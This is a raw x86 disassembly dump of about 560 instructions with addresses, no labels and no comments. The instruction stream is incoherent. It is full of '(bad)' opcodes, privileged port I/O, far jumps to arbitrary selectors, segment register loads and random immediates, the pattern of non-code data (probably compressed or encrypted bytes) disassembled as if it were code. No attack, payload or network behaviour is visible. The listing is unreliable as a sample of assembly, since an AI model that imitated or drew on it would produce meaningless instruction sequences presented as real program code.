  6bc724:	jp     0x6bc731
  6bc726:	or     eax,0x3eb243da
  6bc72b:	repnz pop ecx
  6bc72d:	out    0x8,eax
  6bc72f:	data16 fild WORD PTR [edi+0x1d]
  6bc733:	ret    0x453
  6bc736:	mov    dl,0xf5
  6bc738:	jge    0x6bc6ea
  6bc73a:	push   eax
  6bc73b:	fisttp QWORD PTR ds:0xdc9a9fb8
  6bc741:	mov    esi,0x751513d7
  6bc746:	xchg   ebp,eax
  6bc747:	scas   eax,DWORD PTR es:[edi]
  6bc748:	mov    eax,0xc5102381
  6bc74d:	arpl   ax,dx
  6bc74f:	stc    
  6bc750:	popa   
  6bc751:	xchg   edi,eax
  6bc752:	(bad)  
  6bc754:	pop    ds
  6bc755:	mov    ebx,0xf2453f9b
  6bc75a:	sti    
  6bc75b:	dec    ebx
  6bc75c:	loop   0x6bc715
  6bc75e:	mov    fs,ebp
  6bc760:	or     al,ch
  6bc762:	pop    eax
  6bc763:	mov    esi,0xbbe0fb85
  6bc768:	fwait
  6bc769:	nop
  6bc76a:	pop    ss
  6bc76b:	fadd   st,st(4)
  6bc76d:	fdiv   QWORD PTR [edx-0x6a23ef79]
  6bc773:	outs   dx,BYTE PTR ds:[esi]
  6bc774:	rol    DWORD PTR [ebx+esi*2],cl
  6bc777:	inc    edi
  6bc778:	push   0x6a
  6bc77a:	xchg   esp,eax
  6bc77b:	ficomp DWORD PTR [ebx]
  6bc77d:	int3   
  6bc77e:	jge    0x6bc75f
  6bc780:	xor    eax,0xa19fb9b6
  6bc785:	fdiv   st(0),st
  6bc787:	out    dx,al
  6bc788:	xor    eax,0xbdac308a
  6bc78d:	fsubr  DWORD PTR [eax]
  6bc78f:	sbb    DWORD PTR [esi+edi*1+0x60],edx
  6bc793:	or     al,0x52
  6bc795:	jg     0x6bc719
  6bc797:	ss (bad) 
  6bc799:	(bad)  
  6bc79a:	out    0x1d,eax
  6bc79c:	cmp    DWORD PTR [edx+ebx*1+0x72d0fa9d],ebx
  6bc7a3:	and    eax,0x7ef43625
  6bc7a8:	mov    DWORD PTR [ecx],edi
  6bc7aa:	sti    
  6bc7ab:	mov    edi,es
  6bc7ad:	data16 xor dl,BYTE PTR [edi+0x5b52cc73]
  6bc7b4:	in     eax,0x60
  6bc7b6:	inc    edx
  6bc7b7:	mov    DWORD PTR [edi],esi
  6bc7b9:	out    dx,al
  6bc7ba:	lods   eax,DWORD PTR ds:[esi]
  6bc7bb:	ja     0x6bc7a0
  6bc7bd:	mov    WORD PTR [ebx],ds
  6bc7bf:	sub    DWORD PTR [ebx+0x32],esi
  6bc7c2:	dec    edx
  6bc7c3:	adc    ah,bh
  6bc7c5:	dec    esi
  6bc7c6:	(bad)  
  6bc7c7:	pusha  
  6bc7c8:	push   ebp
  6bc7c9:	xchg   edx,eax
  6bc7ca:	stos   BYTE PTR es:[edi],al
  6bc7cb:	xchg   ebp,eax
  6bc7cc:	fiadd  WORD PTR [bx-0x484]
  6bc7d1:	jp     0x6bc7c5
  6bc7d3:	jecxz  0x6bc7ec
  6bc7d5:	xor    BYTE PTR [edi-0x79],al
  6bc7d8:	imul   BYTE PTR ds:0x26443200
  6bc7de:	jnp    0x6bc814
  6bc7e0:	xchg   ecx,eax
  6bc7e1:	mov    eax,esi
  6bc7e3:	iret   
  6bc7e4:	ret    
  6bc7e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6bc7e6:	adc    eax,0xe904b1cf
  6bc7eb:	cwde   
  6bc7ec:	jle    0x6bc7e5
  6bc7ee:	push   esi
  6bc7ef:	xor    al,0x57
  6bc7f1:	jno    0x6bc7e8
  6bc7f3:	inc    eax
  6bc7f4:	jo     0x6bc77f
  6bc7f6:	fmul   st,st(6)
  6bc7f8:	jp     0x6bc7db
  6bc7fa:	ja     0x6bc829
  6bc7fc:	inc    eax
  6bc7fd:	mov    ecx,0xa3de0c19
  6bc802:	in     al,dx
  6bc803:	mov    edi,0x15d4fe87
  6bc808:	xchg   esp,eax
  6bc809:	jmp    0x6bc7e5
  6bc80b:	push   eax
  6bc80c:	(bad)  
  6bc80d:	or     eax,0x459a3826
  6bc812:	in     eax,0x7a
  6bc814:	inc    ebx
  6bc815:	sbb    cl,BYTE PTR [edx-0x3b73256f]
  6bc81b:	pushf  
  6bc81c:	sbb    al,0x5f
  6bc81e:	and    ch,BYTE PTR [eax]
  6bc820:	inc    esi
  6bc821:	out    dx,al
  6bc822:	fld    QWORD PTR [eax+0x79aef9cd]
  6bc828:	adc    DWORD PTR [edi-0x4a],esi
  6bc82b:	mov    cl,BYTE PTR [esi-0x12f82c27]
  6bc831:	dec    ebx
  6bc832:	inc    edi
  6bc833:	pop    es
  6bc834:	pusha  
  6bc835:	mov    ss,WORD PTR [ebx]
  6bc837:	hlt    
  6bc838:	retf   0xd970
  6bc83b:	scas   al,BYTE PTR es:[edi]
  6bc83c:	mov    fs,WORD PTR [esi]
  6bc83e:	loopne 0x6bc85f
  6bc840:	scas   al,BYTE PTR es:[edi]
  6bc841:	xchg   ebx,eax
  6bc842:	sub    bh,BYTE PTR [eax]
  6bc844:	ss adc eax,0x99347a9c
  6bc84a:	pop    ebx
  6bc84b:	sub    bh,BYTE PTR [edi+0x59]
  6bc84e:	clc    
  6bc84f:	jg     0x6bc892
  6bc851:	fstp   QWORD PTR [esp+ebp*8+0x61]
  6bc855:	retf   0xa48d
  6bc858:	ins    DWORD PTR es:[edi],dx
  6bc859:	pop    esi
  6bc85a:	pop    es
  6bc85b:	jnp    0x6bc80f
  6bc85d:	fnstcw WORD PTR [esi]
  6bc85f:	pop    ecx
  6bc860:	pop    eax
  6bc861:	mov    esp,0xf9da3e14
  6bc866:	sbb    ebx,DWORD PTR [eax+0x3b3e4d3b]
  6bc86c:	push   ebx
  6bc86d:	or     eax,0xeba8b596
  6bc872:	fiadd  WORD PTR [edx-0x51b1575f]
  6bc878:	push   ss
  6bc879:	int3   
  6bc87a:	je     0x6bc862
  6bc87c:	outs   dx,BYTE PTR ds:[esi]
  6bc87d:	push   0xffffffce
  6bc87f:	out    0x52,eax
  6bc881:	push   esi
  6bc882:	mov    BYTE PTR [ebp-0x3e],ch
  6bc885:	lock jp 0x6bc83d
  6bc888:	ss dec edi
  6bc88a:	dec    edi
  6bc88b:	js     0x6bc8e6
  6bc88d:	mov    edx,0x90c45198
  6bc892:	stos   DWORD PTR es:[edi],eax
  6bc893:	ret    
  6bc894:	jns    0x6bc90e
  6bc896:	and    edx,DWORD PTR [edi+0x22]
  6bc899:	ins    DWORD PTR es:[edi],dx
  6bc89a:	pop    eax
  6bc89b:	imul   dh
  6bc89d:	and    eax,0xd7e96365
  6bc8a2:	leave  
  6bc8a3:	sub    DWORD PTR [edx-0x3c],edx
  6bc8a6:	ja     0x6bc8df
  6bc8a8:	fisub  DWORD PTR [edx+0x76]
  6bc8ab:	aam    0x6a
  6bc8ad:	ror    BYTE PTR [edi-0x1d],1
  6bc8b0:	fwait
  6bc8b1:	ja     0x6bc857
  6bc8b3:	and    al,0xa6
  6bc8b5:	(bad)
  6bc8b9:	das    
  6bc8ba:	std    
  6bc8bb:	and    dh,BYTE PTR [eax+0x27]
  6bc8be:	call   0x57261d1b
  6bc8c3:	enter  0xfd4,0x26
  6bc8c7:	sub    dh,BYTE PTR [edi+0x7860ba5]
  6bc8cd:	add    al,ah
  6bc8cf:	mov    cs,WORD PTR [edi+0x68]
  6bc8d2:	pop    esp
  6bc8d3:	and    al,0xef
  6bc8d5:	xlat   BYTE PTR ds:[ebx]
  6bc8d6:	push   es
  6bc8d7:	fisubr DWORD PTR [edi-0x43d21ae1]
  6bc8dd:	fninit 
  6bc8df:	out    dx,al
  6bc8e0:	popf   
  6bc8e1:	stos   DWORD PTR es:[edi],eax
  6bc8e2:	ins    BYTE PTR es:[edi],dx
  6bc8e3:	adc    BYTE PTR [eax+eax*2-0x7b97f6a5],cl
  6bc8ea:	cbw    
  6bc8ec:	xchg   edx,eax
  6bc8ed:	imul   eax,DWORD PTR [ebx+eax*1],0x4b
  6bc8f1:	(bad)  
  6bc8f2:	cmc    
  6bc8f3:	sbb    edi,DWORD PTR [ebp+0x660a0dd3]
  6bc8f9:	sub    BYTE PTR [edi],dl
  6bc8fb:	mov    BYTE PTR [edi],bh
  6bc8fd:	stos   BYTE PTR es:[edi],al
  6bc8fe:	mov    ch,0xcc
  6bc900:	mov    ds,esi
  6bc902:	ja     0x6bc909
  6bc904:	mov    ah,0xcf
  6bc906:	scas   eax,DWORD PTR es:[edi]
  6bc907:	pop    edx
  6bc908:	jne    0x6bc8cb
  6bc90a:	sub    edx,DWORD PTR [edx-0x62]
  6bc90d:	mov    cl,0xa3
  6bc90f:	cld    
  6bc910:	xor    DWORD PTR [eax+0x1636e436],0xffffffd4
  6bc917:	pop    esi
  6bc918:	bound  ebx,QWORD PTR [edi+0x6c5ddf6a]
  6bc91e:	jmp    0x4ddb21b1
  6bc923:	fwait
  6bc924:	cwde   
  6bc925:	leave  
  6bc926:	icebp  
  6bc927:	jmp    0xeab7:0x474b556b
  6bc92e:	js     0x6bc999
  6bc930:	scas   al,BYTE PTR es:[edi]
  6bc931:	pop    edx
  6bc932:	into   
  6bc933:	ret    0x5edc
  6bc936:	add    bl,BYTE PTR [ecx]
  6bc938:	pop    esp
  6bc939:	aad    0x61
  6bc93b:	and    DWORD PTR [ebp-0x6c07946b],ecx
  6bc941:	scas   eax,DWORD PTR es:[edi]
  6bc942:	push   0x5e
  6bc944:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6bc945:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6bc946:	lahf   
  6bc947:	(bad)  
  6bc949:	xor    DWORD PTR [edi],edi
  6bc94b:	gs fwait
  6bc94d:	pop    ecx
  6bc94e:	sbb    ecx,DWORD PTR [eax+0x3ad94bb]
  6bc954:	pop    es
  6bc955:	jmp    0x6bc931
  6bc957:	and    al,0x42
  6bc959:	(bad)  
  6bc95a:	stos   DWORD PTR es:[edi],eax
  6bc95b:	pop    eax
  6bc95c:	repnz imul esi,DWORD PTR [edx+0x61b02a95],0xffffffd9
  6bc964:	xor    bh,BYTE PTR [ebp+0x7a]
  6bc967:	into   
  6bc968:	lock add edx,eax
  6bc96b:	repnz push esi
  6bc96d:	push   eax
  6bc96e:	jnp    0x6bc93c
  6bc970:	jo     0x6bc9d2
  6bc972:	cmp    BYTE PTR [edi+0x45],bl
  6bc975:	or     al,0x70
  6bc977:	mov    esi,0x5b50c01c
  6bc97c:	rol    DWORD PTR [ebx-0x7750b3ca],1
  6bc982:	loop   0x6bc94d
  6bc984:	xlat   BYTE PTR ds:[ebx]
  6bc985:	arpl   cx,bp
  6bc987:	adc    al,BYTE PTR [ecx+eiz*1-0x60ef2592]
  6bc98e:	test   al,0xc4
  6bc990:	jmp    0x6bc9b0
  6bc992:	add    eax,0x1c89e621
  6bc997:	popf   
  6bc998:	jmp    0x6bc9f0
  6bc99a:	mov    al,ds:0x809b8589
  6bc99f:	mov    cl,0xaa
  6bc9a1:	xchg   edi,eax
  6bc9a2:	cmp    esi,eax
  6bc9a4:	fsub   QWORD PTR [eax-0x6918a80e]
  6bc9aa:	inc    esp
  6bc9ab:	fbld   TBYTE PTR [esi-0x2d956dd5]
  6bc9b1:	push   eax
  6bc9b2:	lahf   
  6bc9b3:	loope  0x6bca24
  6bc9b5:	sub    DWORD PTR [esi-0x2b],edi
  6bc9b8:	sub    eax,0xdcdb15ba
  6bc9bd:	pop    edx
  6bc9be:	cld    
  6bc9bf:	and    esi,DWORD PTR [eax-0x2e]
  6bc9c2:	lahf   
  6bc9c3:	jae    0x6bc97b
  6bc9c5:	dec    ecx
  6bc9c6:	popa   
  6bc9c7:	jp     0x6bc95e
  6bc9c9:	pop    ds
  6bc9ca:	sbb    DWORD PTR [bp+0x49],ebx
  6bc9ce:	mov    edx,0x76c9d1bc
  6bc9d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6bc9d4:	adc    esp,ebp
  6bc9d6:	cmp    al,0xa
  6bc9d8:	add    ch,BYTE PTR [edi+0x3c7da604]
  6bc9de:	push   ebp
  6bc9df:	cld    
  6bc9e0:	mov    ebp,0xc4cb42dd
  6bc9e5:	push   edi
  6bc9e6:	inc    edx
  6bc9e7:	sbb    bh,BYTE PTR [ebx-0x25]
  6bc9ea:	cmp    al,ah
  6bc9ec:	cwde   
  6bc9ed:	lea    eax,[ebp+0x5496aa49]
  6bc9f3:	xchg   esp,eax
  6bc9f4:	out    0xbe,eax
  6bc9f6:	leave  
  6bc9f7:	mov    cl,0xa5
  6bc9f9:	shr    ah,1
  6bc9fb:	leave  
  6bc9fc:	retf   0x43c1
  6bc9ff:	iret   
  6bca00:	pop    ss
  6bca01:	or     DWORD PTR [ebx+0xd93d1bc],ebp
  6bca07:	mov    dl,0xd0
  6bca09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6bca0a:	popa   
  6bca0b:	dec    eax
  6bca0c:	mov    eax,ds:0x7d718d9
  6bca11:	pusha  
  6bca12:	in     al,dx
  6bca13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6bca14:	cmp    al,0x1d
  6bca16:	fdivr  QWORD PTR [edi-0x3d]
  6bca19:	test   al,0x4c
  6bca1b:	pop    esi
  6bca1c:	daa    
  6bca1d:	out    dx,eax
  6bca1e:	pop    eax
  6bca1f:	idiv   BYTE PTR [ecx]
  6bca21:	ja     0x6bc9e5
  6bca23:	outs   dx,DWORD PTR ds:[esi]
  6bca24:	int3   
  6bca25:	add    al,0x89
  6bca27:	pop    ebp
  6bca28:	cmp    al,0x4d
  6bca2a:	xor    BYTE PTR [edi-0x7],ah
  6bca2d:	sub    BYTE PTR [ebx+0x577fa79b],dh
  6bca33:	shr    DWORD PTR [esi],1
  6bca35:	in     al,0xcf
  6bca37:	inc    esp
  6bca38:	ret    0xe3ab
  6bca3b:	aaa    
  6bca3c:	rol    BYTE PTR [ecx-0x17],cl
  6bca3f:	and    eax,0x273cf948
  6bca44:	int3   
  6bca45:	pop    ecx
  6bca46:	loop   0x6bc9d3
  6bca48:	inc    esi
  6bca49:	repz cmp dh,BYTE PTR [ebx+0x1b85485f]
  6bca50:	jbe    0x6bcaa7
  6bca52:	in     al,dx
  6bca53:	add    al,0x47
  6bca55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6bca56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6bca57:	jle    0x6bca01
  6bca59:	call   FWORD PTR [edx+0x43]
  6bca5c:	cmp    al,0x45
  6bca5e:	ins    DWORD PTR es:[edi],dx
  6bca5f:	pop    ss
  6bca60:	lahf   
  6bca61:	enter  0xb1ec,0x45
  6bca65:	stos   BYTE PTR es:[edi],al
  6bca66:	or     esi,ebx
  6bca68:	sub    DWORD PTR [eax+edx*4-0x25],edx
  6bca6c:	mov    eax,ds:0x41d6c32e
  6bca71:	repz cwde 
  6bca73:	jnp    0x6bcab2
  6bca75:	xor    al,0xff
  6bca77:	mov    dl,0x1f
  6bca79:	pop    ecx
  6bca7a:	mov    ds:0xc7374294,al
  6bca7f:	js     0x6bca95
  6bca81:	clc    
  6bca82:	push   eax
  6bca83:	dec    ax
  6bca85:	repz fidiv WORD PTR [esi]
  6bca88:	mov    sp,0xf116
  6bca8c:	cmp    BYTE PTR ds:0x42d5165f,bh
  6bca92:	sar    BYTE PTR [edx+0xe4262cc],cl
  6bca98:	jg     0x6bca3e
  6bca9a:	(bad)  
  6bca9b:	cmp    dl,bh
  6bca9d:	iret   
  6bca9e:	inc    eax
  6bca9f:	add    eax,0x2efdf590
  6bcaa4:	leave  
  6bcaa5:	mov    esi,0x5759e431
  6bcaaa:	sti    
  6bcaab:	inc    edx
  6bcaac:	loope  0x6bca74
  6bcaae:	repnz jmp 0xc40d:0x804d560b
  6bcab6:	xchg   edx,eax
  6bcab7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6bcab8:	test   eax,0xe41a6cec
  6bcabd:	lods   eax,DWORD PTR ds:[esi]
  6bcabe:	mov    BYTE PTR [edx-0x73],bh
  6bcac1:	xchg   esp,eax
  6bcac2:	mov    ds:0x6afc9bd6,eax
  6bcac7:	int    0xa0
  6bcac9:	xor    ebx,DWORD PTR [ebp+0x42]
  6bcacc:	inc    ebp
  6bcacd:	sub    eax,0xd8b8e71b
  6bcad2:	sbb    al,0x88
  6bcad4:	sti    
  6bcad5:	lea    ebx,[edx]
  6bcad7:	fwait
  6bcad8:	imul   BYTE PTR [edx+0x3a74d2d7]
  6bcade:	xchg   esi,eax
  6bcadf:	jae    0x6bcb01
  6bcae1:	test   BYTE PTR [ecx-0x56],dl
  6bcae4:	fwait
  6bcae5:	scas   al,BYTE PTR es:[edi]
  6bcae6:	sar    DWORD PTR [eax-0x9874428],1
  6bcaec:	icebp  
  6bcaed:	add    ebx,0xffffffe0
  6bcaf0:	popf   
  6bcaf1:	xlat   BYTE PTR ds:[ebx]
  6bcaf2:	inc    edi
  6bcaf3:	in     al,dx
  6bcaf4:	push   esp
  6bcaf5:	pop    edi
  6bcaf6:	dec    eax
  6bcaf7:	jl     0x6bcb19
  6bcaf9:	scas   eax,DWORD PTR es:[edi]
  6bcafa:	adc    al,0xdf
  6bcafc:	inc    esi
  6bcafd:	inc    ebx
  6bcafe:	jb     0x6bcaef
  6bcb00:	jmp    0x6bcac0
  6bcb02:	push   ecx
  6bcb03:	and    al,0x8d
  6bcb05:	ins    BYTE PTR es:[edi],dx
  6bcb06:	or     eax,0xb9960b6
  6bcb0b:	jle    0x6bcb56
  6bcb0d:	jns    0x6bcafe
  6bcb0f:	dec    DWORD PTR [ebx-0x65]
  6bcb12:	fsubrp st(3),st
  6bcb14:	pop    es
  6bcb15:	jb     0x6bcac9
  6bcb17:	sbb    al,0x3d
  6bcb19:	sar    BYTE PTR [eax+0x577b5934],cl
  6bcb1f:	xchg   ecx,eax
  6bcb20:	(bad)  
  6bcb21:	fnstcw WORD PTR [ecx-0x28]
  6bcb24:	sub    eax,0x7d1c12af
  6bcb29:	adc    eax,0xb030074b
  6bcb2e:	ret    0xbaf9
  6bcb31:	aam    0xbd
  6bcb33:	add    dl,ch
  6bcb35:	lea    esi,[esi-0x4e]
  6bcb38:	sub    DWORD PTR [eax+ebx*8],0x2ba5b80f
  6bcb3f:	sub    al,0x37
  6bcb41:	retf   
  6bcb42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6bcb43:	aad    0x34
  6bcb45:	mov    es,WORD PTR [eax]
  6bcb47:	fxch   st(1)
  6bcb49:	sbb    BYTE PTR [esi+0x23],dl
  6bcb4c:	cwde   
  6bcb4d:	xlat   BYTE PTR ds:[ebx]
  6bcb4e:	lods   al,BYTE PTR ds:[esi]
  6bcb4f:	push   sp
  6bcb51:	inc    edx
  6bcb52:	test   ax,0xa473
  6bcb56:	sbb    DWORD PTR [eax],edi
  6bcb58:	xchg   esp,eax
  6bcb59:	sti    
  6bcb5a:	and    al,0x80
  6bcb5c:	imul   edx,DWORD PTR ds:0xecb5eb,0x1a
  6bcb63:	out    0x3c,al
  6bcb65:	nop
  6bcb66:	mov    DWORD PTR [ecx+0x5c8dfad5],edx
  6bcb6c:	mov    dh,0xa1
  6bcb6e:	cs mov cl,0xd1
  6bcb71:	mov    edx,0xf7331046
  6bcb76:	mov    edx,DWORD PTR [ecx+0x44]
  6bcb79:	test   al,0x63
  6bcb7b:	jo     0x6bcb6a
  6bcb7d:	inc    ebp
  6bcb7e:	cmp    DWORD PTR [eax+0x2872f811],0x8e79a5e
  6bcb88:	xor    esi,0x20
  6bcb8b:	test   eax,0x7eb1bbfb
  6bcb90:	push   0xb36f9f52
  6bcb95:	mov    ch,0x51
  6bcb97:	in     al,dx
  6bcb98:	sbb    edx,DWORD PTR [eax-0x6a]
  6bcb9b:	mov    eax,ds:0xea0ea331
  6bcba0:	bnd call 0x98a0b58
  6bcba6:	mov    cl,0x15
  6bcba8:	jp     0x6bcb76
  6bcbaa:	push   ds
  6bcbab:	xchg   esp,eax
  6bcbac:	sub    al,0xcf
  6bcbae:	push   es
  6bcbaf:	test   DWORD PTR ds:0x33910b7d,ebx
  6bcbb5:	rol    bh,1
  6bcbb7:	js     0x6bcb3a
  6bcbb9:	scas   eax,DWORD PTR es:[edi]
  6bcbba:	aam    0x98
  6bcbbc:	jno    0x6bcba4
  6bcbbe:	add    dl,0x1a
  6bcbc1:	mov    DWORD PTR [ebx-0x3d],esp
  6bcbc4:	sbb    eax,0x204540a5
  6bcbc9:	mov    edx,0x72f62443
  6bcbce:	sub    DWORD PTR [edx],ebx
  6bcbd0:	imul   eax,ecx,0x4d
  6bcbd3:	rol    BYTE PTR [ebx+0x3786cd35],1
  6bcbd9:	fidivr WORD PTR [edi]
  6bcbdb:	add    al,0xed
  6bcbdd:	or     al,0x57
  6bcbdf:	bound  esp,QWORD PTR [edi+0x32]
  6bcbe2:	aaa    
  6bcbe3:	jl     0x6bcbc1
  6bcbe5:	xor    eax,DWORD PTR [ecx-0x38]
  6bcbe8:	gs push es
  6bcbea:	jne    0x6bcc3f
  6bcbec:	retf   0xc65c
  6bcbef:	pop    eax
  6bcbf0:	jnp    0x6bcc30
  6bcbf2:	xor    al,0xfd
  6bcbf4:	fld    st(1)
  6bcbf6:	ja     0x6bcbcc
  6bcbf8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6bcbf9:	mov    dl,0xfa
  6bcbfb:	mov    ch,0xdd
  6bcbfd:	retf   0x30ee
  6bcc00:	int3   
  6bcc01:	ja     0x6bcbbd
  6bcc03:	cmp    eax,0x8474b032
  6bcc08:	push   eax
  6bcc09:	cs hlt 
  6bcc0b:	jecxz  0x6bcb8e
  6bcc0d:	adc    DWORD PTR [edx],esp
  6bcc0f:	cwde   
  6bcc10:	aam    0xf4
  6bcc12:	out    0x98,al
  6bcc14:	sbb    eax,0x3e16b6c7
  6bcc19:	(bad)  
  6bcc1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6bcc1b:	cmp    DWORD PTR [edx*4-0x1a10e3d6],esp
  6bcc22:	mov    ebp,0x7f28679
  6bcc27:	jmp    0x238f:0xdb38afa
  6bcc2e:	jl     0x6bcbfe
  6bcc30:	adc    eax,0x424eb856
  6bcc35:	mov    esi,0x1a061d1a
  6bcc3a:	xor    DWORD PTR [ecx+0x3d],0xffffff8d
  6bcc3e:	jge    0x6bcc0f
  6bcc40:	mov    ebp,0xbe154d01
  6bcc45:	push   es
  6bcc46:	call   0xd3e1:0x41d24bfa
  6bcc4d:	mov    ch,0x2e
  6bcc4f:	push   0x83ed37a2
  6bcc54:	outs   dx,DWORD PTR ds:[esi]
  6bcc55:	push   0x7e
  6bcc57:	jne    0x6bcc42
  6bcc59:	jno    0x6bcc1b
  6bcc5b:	int    0x5a
  6bcc5d:	scas   eax,DWORD PTR es:[edi]
  6bcc5e:	dec    ebp
  6bcc5f:	pushf  
  6bcc60:	mov    eax,ds:0xb3b0d35c
  6bcc65:	ja     0x6bcc68
  6bcc67:	push   0xffffffab
  6bcc69:	xchg   ebx,eax
  6bcc6a:	xlat   BYTE PTR ds:[ebx]
  6bcc6b:	xor    eax,0x82334f7d
  6bcc70:	imul   ebp,DWORD PTR [edx+0x6576178b],0xffffffda
  6bcc77:	and    al,0xb0
  6bcc79:	mov    edi,0xc55df7a7
  6bcc7e:	jbe    0x6bcc7c
  6bcc80:	in     eax,0xf4
  6bcc82:	fwait
  6bcc83:	leave  
  6bcc84:	jecxz  0x6bcc08
  6bcc86:	loope  0x6bccd7
  6bcc88:	inc    edi
  6bcc89:	mov    edi,DWORD PTR [edi-0xf]
  6bcc8c:	mov    DWORD PTR [ebx+eiz*4],esp
  6bcc8f:	scas   eax,DWORD PTR es:[edi]
  6bcc90:	xchg   ebx,eax
  6bcc91:	ret    0x763e
  6bcc94:	sub    DWORD PTR [ebx+0x59],edi
  6bcc97:	jnp    0x6bcc9f
  6bcc99:	dec    ebp
  6bcc9a:	jmp    0x422c:0x9af80c09
  6bcca1:	adc    DWORD PTR [edx],0x5ebc26fd
  6bcca7:	or     dh,BYTE PTR [edi+eax*8-0x26]
  6bccab:	cmp    ch,BYTE PTR [eax+0x139331ba]
  6bccb1:	fistp  DWORD PTR [ecx]
  6bccb3:	or     DWORD PTR [ebx+0x6d2708de],ebp
  6bccb9:	scas   eax,DWORD PTR es:[edi]
  6bccba:	sbb    DWORD PTR [eax+0x3c],edx
  6bccbd:	ffreep st(7)
  6bccbf:	addr16 hlt 
  6bccc1:	shr    DWORD PTR ds:0x5a4c6553,0xae
  6bccc8:	aam    0xbb
  6bccca:	pop    eax
  6bcccb:	daa    
  6bcccc:	xchg   ecx,eax
  6bcccd:	add    BYTE PTR [edi],bh
  6bcccf:	mov    ds:0xde5a227,al
  6bccd4:	fldln2 
  6bccd6:	or     al,0x2c
  6bccd8:	sahf   
  6bccd9:	or     eax,0x708323b6
  6bccde:	adc    eax,0x2a4c1312
  6bcce3:	push   eax
  6bcce4:	bound  edi,QWORD PTR [esi]
  6bcce6:	out    dx,eax
  6bcce7:	xchg   esi,eax
  6bcce8:	sub    esp,DWORD PTR [ecx]
  6bccea:	or     BYTE PTR [ebp-0x3e],bl
  6bcced:	cmc    
  6bccee:	mov    ebx,0xef455fb6
  6bccf3:	popa   
  6bccf4:	xor    al,0xb2
  6bccf6:	in     al,dx
  6bccf7:	push   0x647a294
  6bccfc:	inc    esp
  6bccfd:	cmp    ecx,ebp
  6bccff:	mov    ch,0xa3
  6bcd01:	inc    esi
  6bcd02:	fild   DWORD PTR ds:0x3788621e
  6bcd08:	mov    dh,0x4b
  6bcd0a:	mov    ah,0x56
  6bcd0c:	xchg   DWORD PTR [edx-0x76],ebx
  6bcd0f:	jae    0x6bcd13
  6bcd11:	xor    al,BYTE PTR [edx]
  6bcd13:	jae    0x6bccda
  6bcd15:	nop
  6bcd16:	sub    dh,cl
  6bcd18:	mov    cl,0x70
  6bcd1a:	add    esi,ebp
  6bcd1c:	cmp    DWORD PTR [edi+ecx*1],edi
  6bcd1f:	mov    esi,0x94e6c286
  6bcd24:	mov    ebx,0x8810e038
  6bcd29:	inc    edx
  6bcd2a:	mov    al,0x8a
  6bcd2c:	xor    eax,0xa46181cd
  6bcd31:	mov    eax,ds:0x57171bf0
  6bcd36:	fnstsw WORD PTR [eax+ebp*2-0x21ca1ca6]
  6bcd3d:	out    dx,al
  6bcd3e:	jl     0x6bcd83
  6bcd40:	in     al,dx
  6bcd41:	in     al,0xec
  6bcd43:	dec    esp
  6bcd44:	xchg   esi,eax
  6bcd45:	cwde   
  6bcd46:	push   ss
  6bcd47:	ja     0x6bcd1f
  6bcd49:	and    al,0x9b
  6bcd4b:	adc    ch,al
  6bcd4d:	and    eax,0xea0066f9
  6bcd52:	mov    ch,0x5
  6bcd54:	stc    
  6bcd55:	(bad)  
  6bcd56:	jp     0x6bcd8c
  6bcd58:	dec    ebx
  6bcd59:	sbb    al,0x32
  6bcd5b:	xor    al,0xba
  6bcd5d:	scas   al,BYTE PTR es:[edi]
  6bcd5e:	(bad)  
  6bcd60:	or     esi,esi
  6bcd62:	jge    0x6bcd2c
  6bcd64:	adc    al,0x69
  6bcd66:	in     eax,dx
  6bcd67:	rcl    BYTE PTR [edx+edx*1],0x5b
  6bcd6b:	scas   al,BYTE PTR es:[edi]
  6bcd6c:	jp     0x6bcd78
  6bcd6e:	and    BYTE PTR [edi+edi*2],cl
  6bcd71:	pushf  
  6bcd72:	ins    BYTE PTR es:[edi],dx
  6bcd73:	jge    0x6bcd06
  6bcd75:	iret   
  6bcd76:	(bad)  
  6bcd77:	data16 (bad) 
  6bcd79:	pop    eax
  6bcd7a:	adc    eax,0x1bd17895
  6bcd7f:	into   
  6bcd80:	cdq    
  6bcd81:	inc    ebx
  6bcd82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6bcd83:	std    
  6bcd84:	(bad)  
  6bcd85:	jns    0x6bcd23
  6bcd87:	inc    edi
  6bcd88:	mov    eax,0xad962cc7
  6bcd8d:	inc    edi
  6bcd8e:	mov    dh,0x7d
  6bcd90:	dec    ebp
  6bcd91:	cmp    ecx,DWORD PTR [ebx]
  6bcd93:	jmp    0x6bcdf8
  6bcd95:	repz out 0x5d,eax
  6bcd98:	push   0xfffffff8
  6bcd9a:	(bad)  
  6bcd9b:	imul   ebx,DWORD PTR [esi+0x5395e97a],0xffffffa7
  6bcda2:	and    cl,BYTE PTR [edi]
  6bcda4:	sub    BYTE PTR [ecx+0x148e5fad],0x1
  6bcdab:	pop    ss
  6bcdac:	inc    BYTE PTR cs:[ebx]
  6bcdaf:	jmp    0x8718:0x1c293ca
  6bcdb6:	pop    ebx
  6bcdb7:	dec    esi
  6bcdb8:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6bcdba:	adc    edx,DWORD PTR ds:0x6f86e846
  6bcdc0:	sub    BYTE PTR [edi-0x4a],bh
  6bcdc3:	cmp    al,0x6c
  6bcdc5:	aaa    
  6bcdc6:	or     al,0x8f
  6bcdc8:	fld    st(2)
  6bcdca:	sar    edx,0x93
  6bcdcd:	mov    ch,0xf3
  6bcdcf:	rcr    DWORD PTR [edx-0x50],0x74
  6bcdd3:	imul   ebx,DWORD PTR [ecx+0xe],0xa0668927
  6bcdda:	int    0xfa
  6bcddc:	jp     0x6bce09
  6bcdde:	pusha  
  6bcddf:	call   0x8575:0x3910850
  6bcde6:	push   es
  6bcde7:	rcr    BYTE PTR [ebp-0x55424398],1
  6bcded:	lods   eax,DWORD PTR ds:[esi]
  6bcdee:	fcom   QWORD PTR [esi+0xc]
